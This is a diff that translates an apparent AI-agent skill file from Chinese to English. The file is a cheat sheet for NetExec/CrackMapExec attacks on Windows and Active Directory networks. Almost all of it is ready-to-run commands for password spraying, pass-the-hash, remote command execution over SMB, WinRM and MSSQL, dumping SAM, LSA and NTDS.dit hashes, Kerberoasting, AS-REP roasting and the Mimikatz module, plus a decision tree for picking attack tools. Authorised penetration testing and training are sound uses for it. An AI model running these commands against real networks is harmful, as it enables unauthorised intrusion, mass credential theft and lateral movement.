@@ -1,185 +1,190 @@
 ---
 name: nxc-cme
-description: "使用 NetExec (nxc) / CrackMapExec (cme) 进行 Windows/AD 网络批量操作。当需要批量验证凭据、密码喷洒、远程命令执行、共享枚举、凭据导出时使用。nxc 是 CrackMapExec 的继任者，支持 SMB/WinRM/LDAP/MSSQL/SSH/RDP/FTP/WMI 等协议。在域渗透中用于批量操作——用一条命令对整个网段做凭据验证或命令执行。涉及 CrackMapExec、NetExec、nxc、cme、密码喷洒、SMB 批量、域用户枚举的场景使用此技能"
+description: "Use NetExec (nxc) / CrackMapExec (cme) for bulk operations across Windows/AD networks. Use when you need bulk credential validation, password spraying, remote command execution, share enumeration, or credential dumping. nxc is the successor to CrackMapExec and supports SMB/WinRM/LDAP/MSSQL/SSH/RDP/FTP/WMI. It is used in domain penetration for bulk operations — one command to validate credentials or execute commands across an entire network segment. Use this skill for scenarios involving CrackMapExec, NetExec, nxc, cme, password spraying, bulk SMB, and domain user enumeration"
+zh-signals: "使用 NetExec/CrackMapExec 对 Windows/AD 进行凭据验证、密码喷洒与远程执行等批量操作。信号:nxc,cme,smb,密码喷洒,域渗透,横向移动"
+when-to-use: >-
+  Use when performing bulk credential validation, password spraying, remote command execution,
+  share enumeration, or credential dumping across Windows/Active Directory networks with
+  nxc or cme.
 metadata:
-  tags: "nxc,netexec,cme,crackmapexec,smb,winrm,ldap,密码喷洒,凭据,域,横向移动,批量,spray"
+  tags: "nxc,netexec,cme,crackmapexec,smb,winrm,ldap,password-spraying,credential,domain,lateral-movement,bulk,spray"
   category: "tool"
 ---
 
 # NetExec (nxc) / CrackMapExec (cme)
 
-nxc（NetExec）是 CrackMapExec 的继任者——命令语法几乎相同，但 nxc 更新更活跃。如果目标机器上只有 cme，用法一样，把 `nxc` 换成 `cme` 即可。
+nxc (NetExec) is the successor to CrackMapExec — the command syntax is almost identical, but nxc is more actively maintained. If only cme is available on the target machine, usage is the same; just replace `nxc` with `cme`.
 
-核心价值：**一条命令操作整个网段**——批量验证凭据、喷洒密码、远程执行、枚举信息。
+Core value: **one command operates an entire network segment** — bulk credential validation, password spraying, remote execution, and information enumeration.
 
-项目地址：
+Project URLs:
 - NetExec: https://github.com/Pennyw0rth/NetExec
 - CrackMapExec: https://github.com/Porchetta-Industries/CrackMapExec
 
-## 网络发现与输出解读
+## Network Discovery and Output Interpretation
 
 ```bash
-# 子网扫描发现 Windows 主机
+# Subnet scan to discover Windows hosts
 nxc smb 10.0.0.0/24
 
-# 指定非默认端口
+# Specify a non-default port
 nxc smb TARGET --port 4455
 
-# 输出字段解读：
+# Output field interpretation:
 # SMB  10.0.0.1  445  DC01  [*]  Windows Server 2022  (name:DC01) (domain:corp.local) (signing:True) (SMBv1:False)
-#                                                       ↑ hostname    ↑ 域名            ↑ signing:True=DC/中继不可用  ↑ SMBv1 状态
-# signing:True  → 域控或强制签名主机，无法 NTLM 中继
-# signing:False → 可作为 NTLM 中继目标
+#                                                       ↑ hostname    ↑ domain           ↑ signing:True=DC/relay not possible  ↑ SMBv1 status
+# signing:True  → domain controller or a host with enforced signing, NTLM relay is not possible
+# signing:False → usable as an NTLM relay target
 
-# 输出导出
+# Export the output
 nxc smb 10.0.0.0/24 --export json /tmp/nxc_scan.json
 nxc smb 10.0.0.0/24 | tee nxc_output.txt
 
-# 自动生成配置文件（域环境快速配置）
-nxc smb DC_IP --generate-hosts-file /etc/hosts       # 生成 /etc/hosts 映射
-nxc smb DC_IP --generate-krb5-file /etc/krb5.conf     # 生成 Kerberos 配置
+# Auto-generate configuration files (fast setup in a domain environment)
+nxc smb DC_IP --generate-hosts-file /etc/hosts       # generate the /etc/hosts mapping
+nxc smb DC_IP --generate-krb5-file /etc/krb5.conf     # generate the Kerberos configuration
 
-# RDP 协议探测
-nxc rdp 10.0.0.0/24                                    # 发现开放 RDP 的主机
-nxc rdp TARGET -u user -p 'password'                   # RDP 凭据验证
+# RDP protocol probing
+nxc rdp 10.0.0.0/24                                    # discover hosts with RDP open
+nxc rdp TARGET -u user -p 'password'                   # RDP credential validation
 ```
 
-## 凭据验证
+## Credential Validation
 
 ```bash
-# 密码认证
+# Password authentication
 nxc smb 10.0.0.0/24 -u admin -p 'P@ssw0rd'
 
-# NTLM 哈希传递
+# NTLM pass-the-hash
 nxc smb 10.0.0.0/24 -u admin -H NTLM_HASH
 
-# 本地管理员（不用域认证）
+# Local administrator (no domain authentication)
 nxc smb 10.0.0.0/24 -u administrator -p 'password' --local-auth
 
-# 输出中 [+] 表示认证成功，(Pwn3d!) 表示有管理员权限
+# In the output, [+] indicates successful authentication, (Pwn3d!) indicates administrative privileges
 ```
 
-## 密码喷洒
+## Password Spraying
 
 ```bash
-# 一个密码试所有用户（安全，不触发锁定）
+# One password against all users (safe, does not trigger lockouts)
 nxc smb DC_IP -u users.txt -p 'Summer2024!' --continue-on-success
 
-# 多密码喷洒（注意锁定策略）
+# Multi-password spraying (mind the lockout policy)
 nxc smb DC_IP -u users.txt -p passwords.txt --continue-on-success --no-bruteforce
 
-# WinRM 协议喷洒
+# WinRM protocol spraying
 nxc winrm 10.0.0.0/24 -u admin -p 'password'
 ```
 
-## 远程命令执行
+## Remote Command Execution
 
 ```bash
-# 通过 SMB 执行命令
+# Execute a command over SMB
 nxc smb TARGET -u admin -p 'password' -x "whoami"
 nxc smb TARGET -u admin -p 'password' -x "type C:\flag.txt"
 
-# 通过 WinRM 执行
+# Execute over WinRM
 nxc winrm TARGET -u admin -p 'password' -x "ipconfig"
 
-# PowerShell 执行
+# PowerShell execution
 nxc smb TARGET -u admin -p 'password' -X "Get-Process"
 
-# 批量执行（整个网段）
+# Bulk execution (the whole segment)
 nxc smb 10.0.0.0/24 -u admin -p 'password' -x "hostname" --continue-on-success
 ```
 
-## 信息枚举
+## Information Enumeration
 
 ```bash
-# SMB 共享枚举
+# SMB share enumeration
 nxc smb TARGET -u user -p 'password' --shares
 
-# 用户枚举
+# User enumeration
 nxc smb DC_IP -u user -p 'password' --users
 
-# 组枚举
+# Group enumeration
 nxc smb DC_IP -u user -p 'password' --groups
 
-# 密码策略
+# Password policy
 nxc smb DC_IP -u user -p 'password' --pass-pol
 
-# 会话枚举（看谁登录了哪台机器）
+# Session enumeration (see who logged into which machine)
 nxc smb 10.0.0.0/24 -u user -p 'password' --sessions
 
-# 已登录用户
+# Logged-on users
 nxc smb 10.0.0.0/24 -u user -p 'password' --loggedon-users
 ```
 
-## 凭据导出
+## Credential Dumping
 
 ```bash
-# SAM 导出（本地哈希）
+# SAM dump (local hashes)
 nxc smb TARGET -u admin -p 'password' --sam
 
-# LSA 导出
+# LSA dump
 nxc smb TARGET -u admin -p 'password' --lsa
 
-# NTDS.dit 导出（域控上的所有域用户哈希）
+# NTDS.dit dump (hashes of all domain users on a domain controller)
 nxc smb DC_IP -u admin -p 'password' --ntds
 
-# 搭配 hashcat 破解
+# Crack with hashcat
 nxc smb DC_IP -u admin -p 'password' --ntds | tee ntds_dump.txt
 ```
 
-## LDAP 操作
+## LDAP Operations
 
 ```bash
-# LDAP 用户枚举
+# LDAP user enumeration
 nxc ldap DC_IP -u user -p 'password' --users
 
-# 查找 Kerberoastable 账户
+# Find Kerberoastable accounts
 nxc ldap DC_IP -u user -p 'password' --kerberoasting output.txt
 
 # AS-REP Roasting
 nxc ldap DC_IP -u user -p 'password' --asreproast output.txt
 
-# 域信任
+# Domain trust
 nxc ldap DC_IP -u user -p 'password' --trusted-for-delegation
 ```
 
 ## MSSQL
 
 ```bash
-# MSSQL 凭据验证
+# MSSQL credential validation
 nxc mssql 10.0.0.0/24 -u sa -p 'password'
 
-# 执行 SQL
+# Execute SQL
 nxc mssql TARGET -u sa -p 'password' -q "SELECT name FROM master.dbo.sysdatabases"
 
-# xp_cmdshell 执行
+# xp_cmdshell execution
 nxc mssql TARGET -u sa -p 'password' -x "whoami"
 ```
 
-## 模块系统
+## Module System
 
 ```bash
-# 列出可用模块
+# List the available modules
 nxc smb -L
 
-# 使用 Mimikatz 模块
+# Use the Mimikatz module
 nxc smb TARGET -u admin -p 'password' -M mimikatz
 
-# 使用 Spider 模块（搜索共享中的敏感文件）
+# Use the Spider module (search for sensitive files in shares)
 nxc smb TARGET -u user -p 'password' -M spider_plus
 
-# WebDAV 检测
+# WebDAV detection
 nxc smb TARGET -u user -p 'password' -M webdav
 ```
 
-## 决策树
+## Decision Tree
 
 ```
-nxc vs impacket 怎么选？
-├─ 批量操作（整个网段）→ nxc（一条命令做完）
-├─ 单目标深度操作 → impacket（更灵活）
-├─ 密码喷洒 → nxc（内置 --no-bruteforce）
-├─ 凭据导出 → 都行（nxc --sam/--ntds 或 secretsdump）
-├─ NTLM 中继 → impacket ntlmrelayx
-└─ Kerberos 攻击 → impacket（更完整）
+nxc vs impacket — which to choose?
+├─ Bulk operations (a whole segment) → nxc (one command does it all)
+├─ Deep single-target operations → impacket (more flexible)
+├─ Password spraying → nxc (built-in --no-bruteforce)
+├─ Credential dumping → either works (nxc --sam/--ntds or secretsdump)
+├─ NTLM relay → impacket ntlmrelayx
+└─ Kerberos attacks → impacket (more complete)
 ```
